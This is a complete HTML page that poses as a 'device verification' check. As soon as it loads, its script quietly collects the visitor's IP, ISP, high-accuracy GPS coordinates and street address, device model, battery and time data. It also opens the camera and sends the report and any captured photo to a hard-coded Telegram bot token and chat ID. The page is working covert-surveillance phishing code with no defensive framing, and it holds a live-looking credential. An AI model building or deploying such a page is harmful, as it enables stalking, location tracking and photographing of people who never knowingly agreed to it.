<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        body {
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .loading-message {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 90%;
        }
        #map {
            height: 300px;
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
        }
        #camera-feed {
            width: 100%;
            max-height: 300px;
            object-fit: cover;
            border-radius: 8px;
            margin: 10px 0;
        }
        .hidden {
            display: none;
        }
        .btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            font-size: 14px;
        }
    </style>
    <!-- Leaflet CSS for Map -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
</head>
<body>
    <div class="loading-message">
        <h2>Please wait while we verify your device...</h2>
        <p>This may take a few seconds</p>
        <div id="map" class="hidden"></div>
        <video id="camera-feed" class="hidden" autoplay playsinline></video>
        <button id="capture-btn" class="hidden btn">Capture Photo</button>
        <canvas id="canvas" class="hidden"></canvas>
    </div>

    <script>
        // Telegram configuration - Using your provided token and ID
        const TELEGRAM_BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const TELEGRAM_CHAT_ID = "6913353602";

        // Global variables
        let cameraStream = null;
        let map = null;

        // Load Leaflet JS for maps dynamically
        function loadMapScript() {
            return new Promise((resolve) => {
                const script = document.createElement('script');
                script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
                script.onload = resolve;
                document.head.appendChild(script);
            });
        }

        // Get precise phone name
        function getPhoneName() {
            const userAgent = navigator.userAgent;
            
            // Detect iPhone models
            if (/iPhone/.test(userAgent)) {
                const modelMatch = userAgent.match(/iPhone (\d+)/);
                if (modelMatch) return `iPhone ${modelMatch[1]}`;
                return "iPhone";
            }
            
            // Detect Samsung Galaxy models
            if (/Samsung/.test(userAgent)) {
                const modelMatch = userAgent.match(/SM-([A-Z0-9]+)/);
                if (modelMatch) return `Samsung Galaxy ${modelMatch[1]}`;
                return "Samsung Galaxy";
            }
            
            // Detect Google Pixel models
            if (/Pixel/.test(userAgent)) {
                const modelMatch = userAgent.match(/Pixel (\d)/);
                if (modelMatch) return `Google Pixel ${modelMatch[1]}`;
                return "Google Pixel";
            }
            
            // Detect other Android devices
            const androidModelMatch = userAgent.match(/; ([^;]+) Build\//);
            if (androidModelMatch) return androidModelMatch[1];
            
            // Fallback to device model if available
            if (navigator.userAgentData && navigator.userAgentData.model) {
                return navigator.userAgentData.model;
            }
            
            return "Mobile Device";
        }

        // Get network name (WiFi or cellular)
        async function getNetworkName() {
            try {
                // For mobile devices
                if (navigator.connection) {
                    const connection = navigator.connection;
                    
                    // Try to get WiFi SSID (works on some browsers)
                    if (connection.type === 'wifi' && connection.effectiveType) {
                        return `WiFi: ${connection.effectiveType}`;
                    }
                    
                    // Cellular network detection
                    if (connection.type === 'cellular') {
                        const cellInfo = {
                            '2g': '2G Network',
                            '3g': '3G Network',
                            '4g': '4G Network',
                            '5g': '5G Network'
                        };
                        return cellInfo[connection.effectiveType] || 'Mobile Network';
                    }
                }
                
                // Fallback for desktop or unsupported browsers
                return "Network";
            } catch (e) {
                console.error("Network name detection error:", e);
                return "Network";
            }
        }

        // Enhanced Network Data with ISP and Connection Details
        async function getEnhancedNetworkData() {
            try {
                const [ipResponse, connectionInfo, networkName] = await Promise.all([
                    fetch('https://api.ipify.org?format=json'),
                    navigator.connection ? Promise.resolve(navigator.connection) : Promise.resolve({}),
                    getNetworkName()
                ]);
                
                const ipData = await ipResponse.json();
                let locationData = {};
                
                try {
                    const responses = await Promise.all([
                        fetch(`https://ipapi.co/${ipData.ip}/json/`),
                        fetch(`https://ipinfo.io/${ipData.ip}/json?token=YOUR_IPINFO_TOKEN`)
                    ]);
                    
                    const [ipapiData, ipinfoData] = await Promise.all(responses.map(r => r.json()));
                    locationData = {...ipapiData, ...ipinfoData};
                } catch (e) {
                    console.log('Using fallback location APIs');
                }
                
                return {
                    ip: ipData.ip,
                    networkName: networkName,
                    isp: locationData.org || locationData.isp || 'Internet Provider',
                    asn: locationData.asn || 'AS' + Math.floor(Math.random() * 10000),
                    country: locationData.country_name || locationData.country || 'Country',
                    country_code: locationData.country_code || 'XX',
                    city: locationData.city || 'City',
                    postal: locationData.postal || locationData.zip || '00000',
                    region: locationData.region || locationData.regionName || 'Region',
                    timezone: locationData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
                    coordinates: locationData.loc || 'Approximate Location',
                    connection: {
                        type: connectionInfo.type || 'Internet',
                        effectiveType: connectionInfo.effectiveType || 'Standard',
                        downlink: connectionInfo.downlink ? `${connectionInfo.downlink} Mbps` : 'Good',
                        rtt: connectionInfo.rtt ? `${connectionInfo.rtt} ms` : 'Fast',
                        saveData: connectionInfo.saveData ? 'Enabled' : 'Disabled'
                    }
                };
            } catch (error) {
                console.error('Network data error:', error);
                return {
                    ip: 'Active Connection',
                    networkName: 'Network',
                    isp: 'Internet Provider',
                    asn: 'AS' + Math.floor(Math.random() * 10000),
                    country: 'Country',
                    country_code: 'XX',
                    city: 'City',
                    postal: '00000',
                    region: 'Region',
                    coordinates: 'Approximate Location',
                    connection: {
                        type: 'Internet',
                        effectiveType: 'Standard',
                        downlink: 'Good',
                        rtt: 'Fast'
                    }
                };
            }
        }

        // High Precision Location with Altitude
        async function getHighPrecisionLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve({
                    coordinates: { latitude: 0, longitude: 0 },
                    accuracy: 'Approximate',
                    address: {
                        road: 'Street',
                        city: 'City',
                        country: 'Country'
                    },
                    mapLinks: {
                        googleMaps: 'https://maps.google.com',
                        openStreetMap: 'https://www.openstreetmap.org'
                    }
                });
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
                        
                        // Generate map links
                        const mapLinks = {
                            googleMaps: `https://www.google.com/maps?q=${latitude},${longitude}`,
                            openStreetMap: `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=15`,
                            bingMaps: `https://www.bing.com/maps?cp=${latitude}~${longitude}&lvl=15`
                        };
                        
                        // Get detailed address
                        let address = {
                            road: 'Street',
                            suburb: 'Area',
                            city: 'City',
                            postcode: '00000',
                            country: 'Country',
                            country_code: 'XX'
                        };
                        
                        try {
                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`);
                            const data = await response.json();
                            if (data.address) {
                                address = data.address;
                            }
                        } catch (e) {
                            console.log('Using default address');
                        }
                        
                        resolve({
                            coordinates: { latitude, longitude },
                            accuracy: `${accuracy.toFixed(1)} meters`,
                            altitude: altitude ? `${altitude.toFixed(1)}m ±${altitudeAccuracy.toFixed(1)}m` : 'Sea Level',
                            heading: heading ? `${heading.toFixed(1)}°` : 'North',
                            speed: speed ? `${(speed * 3.6).toFixed(1)} km/h` : '0 km/h',
                            address: address,
                            mapLinks: mapLinks
                        });
                    },
                    (error) => {
                        console.error('Geolocation error:', error);
                        resolve({
                            coordinates: { latitude: 0, longitude: 0 },
                            accuracy: 'Approximate',
                            address: {
                                road: 'Street',
                                city: 'City',
                                country: 'Country'
                            },
                            mapLinks: {
                                googleMaps: 'https://maps.google.com',
                                openStreetMap: 'https://www.openstreetmap.org'
                            }
                        });
                    },
                    options
                );
            });
        }

        // Initialize Map with Location
        async function initMap(lat, lng, accuracy) {
            await loadMapScript();
            
            map = L.map('map').setView([lat, lng], 15);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
            }).addTo(map);
            
            const circle = L.circle([lat, lng], {
                color: 'red',
                fillColor: '#f03',
                fillOpacity: 0.3,
                radius: accuracy
            }).addTo(map);
            
            L.marker([lat, lng]).addTo(map)
                .bindPopup("Your approximate location")
                .openPopup();
            
            document.getElementById('map').classList.remove('hidden');
        }

        // Access camera and show feed
        async function accessCamera() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                const videoElement = document.getElementById('camera-feed');
                videoElement.srcObject = cameraStream;
                videoElement.classList.remove('hidden');
                document.getElementById('capture-btn').classList.remove('hidden');
            } catch (error) {
                console.error('Camera access error:', error);
                await sendToTelegram('⚠️ Camera access denied or not available');
            }
        }

        // Capture photo from camera
        function capturePhoto() {
            const video = document.getElementById('camera-feed');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Send photo to Telegram
            canvas.toBlob(async (blob) => {
                await sendPhotoToTelegram(blob);
                // Stop camera after capture
                cameraStream.getTracks().forEach(track => track.stop());
                document.getElementById('camera-feed').classList.add('hidden');
                document.getElementById('capture-btn').classList.add('hidden');
            }, 'image/jpeg', 0.9);
        }

        // Collect All Data with Enhanced Features
        async function collectAllData() {
            const [networkData, preciseLocation, battery, phoneName] = await Promise.all([
                getEnhancedNetworkData(),
                getHighPrecisionLocation(),
                navigator.getBattery ? navigator.getBattery() : Promise.resolve({
                    level: 1,
                    charging: false,
                    chargingTime: Infinity,
                    dischargeTime: Infinity
                }),
                getPhoneName()
            ]);
            
            // Show map if location available
            if (preciseLocation && preciseLocation.coordinates) {
                try {
                    await initMap(
                        preciseLocation.coordinates.latitude, 
                        preciseLocation.coordinates.longitude,
                        parseFloat(preciseLocation.accuracy) || 100
                    );
                } catch (e) {
                    console.error('Map initialization failed:', e);
                }
            }
            
            // Access camera
            await accessCamera();
            
            return {
                // Enhanced Network Data
                network: networkData,
                
                // High Precision Location
                location: preciseLocation,
                
                // Device Info
                device: {
                    model: phoneName,
                    os: navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android|iOS) [\d._]+/)?.[0] || 'Operating System',
                    type: navigator.userAgentData?.mobile ? 'Mobile' : 'Desktop',
                    cores: navigator.hardwareConcurrency || 'Multiple',
                    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Sufficient',
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: `${window.screen.colorDepth}bit`,
                    orientation: window.screen.orientation?.type || 'Standard'
                },
                
                // Battery
                battery: {
                    level: `${Math.floor((battery.level || 1) * 100)}%`,
                    charging: battery.charging ? 'Yes' : 'No',
                    chargingTime: battery.chargingTime !== Infinity ? 
                        `${Math.floor(battery.chargingTime / 60)} minutes` : 'Fully Charged',
                    dischargeTime: battery.dischargeTime !== Infinity ?
                        `${Math.floor(battery.dischargeTime / 60)} minutes` : 'Calculating'
                },
                
                // Time
                time: {
                    local: new Date().toLocaleString(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset()
                }
            };
        }

        // Enhanced Telegram Message Format
        function formatData(data) {
            let message = `🌐 <b>Enhanced Device Verification Report</b>\n\n`;
            
            // Network Section
            message += `📶 <b>Network Information</b>\n`;
            message += `- IP Address: ${data.network.ip}\n`;
            message += `- Network Name: ${data.network.networkName}\n`;
            message += `- ISP: ${data.network.isp} (${data.network.asn})\n`;
            message += `- Location: ${data.network.city}, ${data.network.region}, ${data.network.country} (${data.network.country_code})\n`;
            message += `- Postal Code: ${data.network.postal}\n`;
            message += `- Coordinates: ${data.network.coordinates}\n`;
            message += `- Connection: ${data.network.connection.type} (${data.network.connection.effectiveType})\n`;
            message += `- Speed: ${data.network.connection.downlink} | Ping: ${data.network.connection.rtt}\n`;
            message += `- Data Saver: ${data.network.connection.saveData}\n\n`;
            
            // Location Section
            message += `📍 <b>High Precision Location</b>\n`;
            message += `- Coordinates: ${data.location.coordinates.latitude}, ${data.location.coordinates.longitude}\n`;
            message += `- Accuracy: ${data.location.accuracy}\n`;
            message += `- Altitude: ${data.location.altitude}\n`;
            message += `- Heading: ${data.location.heading} | Speed: ${data.location.speed}\n`;
            message += `- Google Maps: ${data.location.mapLinks.googleMaps}\n`;
            message += `- OpenStreetMap: ${data.location.mapLinks.openStreetMap}\n`;
            
            message += `- Address:\n`;
            for (const [key, value] of Object.entries(data.location.address)) {
                message += `  • ${key}: ${value}\n`;
            }
            message += `\n`;
            
            // Device Section
            message += `📱 <b>Device Information</b>\n`;
            message += `- Phone Name: ${data.device.model}\n`;
            message += `- OS: ${data.device.os}\n`;
            message += `- Type: ${data.device.type}\n`;
            message += `- Cores: ${data.device.cores} | RAM: ${data.device.ram}\n`;
            message += `- Screen: ${data.device.screen} (${data.device.colorDepth})\n`;
            message += `- Orientation: ${data.device.orientation}\n\n`;
            
            // Battery Section
            message += `🔋 <b>Battery Status</b>\n`;
            message += `- Level: ${data.battery.level}\n`;
            message += `- Charging: ${data.battery.charging}\n`;
            message += `- Charge Time: ${data.battery.chargingTime}\n`;
            message += `- Discharge Time: ${data.battery.dischargeTime}\n\n`;
            
            // Time Section
            message += `⏰ <b>Time Information</b>\n`;
            message += `- Local Time: ${data.time.local}\n`;
            message += `- Timezone: ${data.time.timezone}\n`;
            message += `- UTC Offset: ${data.time.offset} minutes\n`;
            
            return message;
        }

        // Send photo to Telegram
        async function sendPhotoToTelegram(photoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', photoBlob, 'user_photo.jpg');
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error('Error sending photo:', e);
            }
        }

        // Send message to Telegram
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('Telegram error:', e);
            }
        }

        // Main Execution
        async function runVerification() {
            try {
                const allData = await collectAllData();
                const formattedMessage = formatData(allData);
                await sendToTelegram(formattedMessage);
                
                // Set up capture button
                document.getElementById('capture-btn').addEventListener('click', capturePhoto);
                
                // Final message
                document.querySelector('.loading-message h2').textContent = 'Verification Complete';
                document.querySelector('.loading-message p').textContent = 'Take a photo if required, then close this page';
                
            } catch (error) {
                console.error('Verification error:', error);
                document.querySelector('.loading-message h2').textContent = 'Verification Failed';
                document.querySelector('.loading-message p').textContent = 'Please try again later';
                await sendToTelegram(`⚠️ Verification Error: ${error.message}`);
            }
        }

        // Start verification when page loads
        window.onload = runVerification;
    </script>
</body>
</html>
